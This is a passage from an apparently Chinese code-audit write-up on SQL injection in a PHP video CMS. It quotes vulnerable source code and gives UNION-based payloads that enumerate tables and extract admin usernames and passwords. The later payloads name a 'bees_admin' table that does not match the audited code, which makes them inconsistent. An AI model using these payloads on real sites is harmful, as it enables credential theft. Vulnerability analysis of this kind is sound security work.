punctuation\">&#125;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$d_user</span><span class=\"token operator\">></span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\t\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token function\">alert_href</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'请注册会员登录后观看'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">''</span><span class=\"token operator\">.</span><span class=\"token variable\">$xtcms_domain</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'ucenter'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'select * from xtcms_user where u_name=\"'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user_name'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\"'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//查询会员积分</span>\n     <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_fetch_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n     <span class=\"token variable\">$u_points</span><span class=\"token operator\">=</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_points'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//会员积分</span>\n     <span class=\"token variable\">$u_plays</span><span class=\"token operator\">=</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_plays'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//会员观看记录</span>\n     <span class=\"token variable\">$u_end</span><span class=\"token operator\">=</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_end'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//到期时间</span>\n\t <span class=\"token variable\">$u_group</span><span class=\"token operator\">=</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_group'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//到期时间</span>\n     <span class=\"token punctuation\">&#125;</span>\t\t \n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$u_group</span><span class=\"token operator\">&lt;</span><span class=\"token variable\">$d_user</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token function\">alert_href</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'您的会员组不支持观看此视频!'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">''</span><span class=\"token operator\">.</span><span class=\"token variable\">$xtcms_domain</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'ucenter/mingxi.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">get_play</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$t0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'select * from xtcms_player where id ='</span><span class=\"token operator\">.</span><span class=\"token variable\">$t0</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_fetch_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token keyword\">return</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'n_url'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token keyword\">return</span> <span class=\"token variable\">$t0</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'select * from xtcms_vod where d_id ='</span><span class=\"token operator\">.</span><span class=\"token variable\">$d_id</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_fetch_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token variable\">$d_scontent</span><span class=\"token operator\">=</span><span class=\"token function\">explode</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"\\r\\n\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'d_scontent'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//print_r($d_scontent);</span>\n<span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span><span class=\"token operator\">&lt;</span><span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$d_scontent</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\t<span class=\"token variable\">$d_scontent</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token function\">explode</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'$'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$d_scontent</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$playdizhi</span><span class=\"token operator\">=</span><span class=\"token function\">get_play</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'d_player'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token variable\">$d_scontent</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token keyword\">return</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\t\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'template/'</span><span class=\"token operator\">.</span><span class=\"token variable\">$xtcms_bdyun</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'/bplay.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里的话可以看出主要的SQL语句是这句话</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'select * from xtcms_vod where d_id = '</span><span class=\"token operator\">.</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'play'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">' '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>然后这个<code>play</code>参数是GET传参的，同时看这里的代码可以看出它是没有单引号或者双引号包裹的，此时我们跟进一下include的文件,也就是<code>system/inc.php</code>，查看一下这个文件<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151120.png\" alt=\"在这里插入图片描述\"></p>\n<p>跟进这个<code>library.php</code></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token comment\">//展示的只是一部分</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">defined</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'PCFINAL'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Request Error!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">get_magic_quotes_gpc</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token variable\">$_GET</span> <span class=\"token operator\">=</span> <span class=\"token function\">addslashes_deep</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token variable\">$_POST</span> <span class=\"token operator\">=</span> <span class=\"token function\">addslashes_deep</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token variable\">$_COOKIE</span> <span class=\"token operator\">=</span> <span class=\"token function\">addslashes_deep</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$_REQUEST</span> <span class=\"token operator\">=</span> <span class=\"token function\">addslashes_deep</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>可以发现这里的话对传入的参数都进行了特殊字符转义，防止SQL注入<br>但事实上我们那个参数未被单引号或者双引号包裹，这也就意味着这里的防护其实是无意义的，因此我们这里的话我们也就可以尝试去进行SQL注入<br>首先我们试着去检测一下字段数，payload如下所示</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">play<span class=\"token operator\">=</span><span class=\"token number\">1</span> order by <span class=\"token number\">17</span>  <span class=\"token comment\">//回显正常</span>\nplay<span class=\"token operator\">=</span><span class=\"token number\">1</span> order by <span class=\"token number\">18</span>  <span class=\"token comment\">//回显错误</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151155.png\" alt=\"在这里插入图片描述\"></p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151234.png\" alt=\"在这里插入图片描述\"><br>这里的话也就可以发现字段数为17了，接下来就可以进去联合查询了，首先我们需要去找一下回显位</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">play<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span> union select <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token number\">9</span><span class=\"token punctuation\">,</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span><span class=\"token number\">11</span><span class=\"token punctuation\">,</span><span class=\"token number\">12</span><span class=\"token punctuation\">,</span><span class=\"token number\">13</span><span class=\"token punctuation\">,</span><span class=\"token number\">14</span><span class=\"token punctuation\">,</span><span class=\"token number\">15</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">,</span><span class=\"token number\">17</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151299.png\" alt=\"在这里插入图片描述\"><br>可以发现回显位是2和9，我们这个时候就可以去读取数据库、数据表这些了，payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token comment\">//查库</span>\nplay<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span> union select <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token function\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span><span class=\"token number\">11</span><span class=\"token punctuation\">,</span><span class=\"token number\">12</span><span class=\"token punctuation\">,</span><span class=\"token number\">13</span><span class=\"token punctuation\">,</span><span class=\"token number\">14</span><span class=\"token punctuation\">,</span><span class=\"token number\">15</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">,</span> <span class=\"token number\">17</span>\n<span class=\"token comment\">//查表</span>\nplay<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span> union select <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>select <span class=\"token function\">group_concat</span><span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">)</span> from information_schema<span class=\"token operator\">.</span>tables where table_schema<span class=\"token operator\">=</span><span class=\"token function\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span><span class=\"token number\">11</span><span class=\"token punctuation\">,</span><span class=\"token number\">12</span><span class=\"token punctuation\">,</span><span class=\"token number\">13</span><span class=\"token punctuation\">,</span><span class=\"token number\">14</span><span class=\"token punctuation\">,</span><span class=\"token number\">15</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">,</span> <span class=\"token number\">17</span>\n<span class=\"token comment\">//查列</span>\nplay<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span> union select <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>select <span class=\"token function\">group_concat</span><span class=\"token punctuation\">(</span>column_name<span class=\"token punctuation\">)</span> from information_schema<span class=\"token operator\">.</span>columns where table_name<span class=\"token operator\">=</span><span class=\"token number\">0x626565735f61646d696e</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span><span class=\"token number\">11</span><span class=\"token punctuation\">,</span><span class=\"token number\">12</span><span class=\"token punctuation\">,</span><span class=\"token number\">13</span><span class=\"token punctuation\">,</span><span class=\"token number\">14</span><span class=\"token punctuation\">,</span><span class=\"token number\">15</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">,</span> <span class=\"token number\">17</span><span class=\"token comment\">//之所以用十六进制是因为这里的单引号会被转义</span>\n<span class=\"token comment\">//查字段</span>\nplay<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span> union select <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>select <span class=\"token function\">group_concat</span><span class=\"token punctuation\">(</span>admin_name<span class=\"token punctuation\">,</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">,</span>admin_password<span class=\"token punctuation\">)</span> from bees_admin<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span><span class=\"token number\">11</span><span class=\"token punctuation\">,</span><span class=\"token number\">12</span><span class=\"token punctuation\">,</span><span class=\"token number\">13</span><span class=\"token punctuation\">,</span><span class=\"token number\">14</span><span class=\"token punctuation\">,</span><span class=\"token number\">15</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">,</span> <span class=\"token number\">17</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151403.png\" alt=\"在这里插入图片描述\"><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151670.png\" alt=\"在这里插入图片描述\"><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151724.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"wap-user-php（失败）\"><a href=\"#wap-user-php（失败）\" class=\"headerlink\" title=\"wap/user.php（失败）\"></a>wap/user.php（失败）</h3><p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151794.png\" alt=\"在这里插入图片描述\"><br>结合Seay</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'../system/inc.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$op</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'op'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token function\">alert_href</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'请登陆后进入'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'login.php?op=login'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token comment\">//退出</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$op</span> <span class=\"token operator\">==</span> <span class=\"token string single-quoted-string\">'out'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\t\n<span class=\"token keyword\">unset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">unset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user_group'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span> <span class=\"token keyword\">empty</span> <span class=\"token punctuation\">(</span> <span class=\"token variable\">$_COOKIE</span> <span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user_name'</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token operator\">!</span> <span class=\"token keyword\">empty</span> <span class=\"token punctuation\">(</span> <span class=\"token variable\">$_COOKIE</span> <span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user_password'</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>   \n    <span class=\"token punctuation\">&#123;</span>  \n        <span class=\"token function\">setcookie</span> <span class=\"token punctuation\">(</span> <span class=\"token string double-quoted-string\">\"user_name\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">,</span> <span class=\"token function\">time</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">3600</span> <span class=\"token operator\">*</span> <span class=\"token number\">24</span> <span class=\"token operator\">*</span> <span class=\"token number\">365</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  \n        <span class=\"token function\">setcookie</span> <span class=\"token punctuation\">(</span> <span class=\"token string double-quoted-string\">\"user_password\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">,</span> <span class=\"token function\">time</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">3600</span> <span class=\"token operator\">*</span> <span class=\"token number\">24</span> <span class=\"token operator\">*</span> <span class=\"token number\">365</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  \n    <span class=\"token punctuation\">&#125;</span>  \n<span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'location:login.php?op=login'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">//支付</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'paysave'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pay'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\n<span class=\"token comment\">//判定会员组别</span>\n<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'select * from xtcms_user where u_name=\"'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user_name'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\"'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_fetch_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\n<span class=\"token variable\">$u_points</span><span class=\"token operator\">=</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_points'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$u_group</span><span class=\"token operator\">=</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_group'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$send</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_end'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token 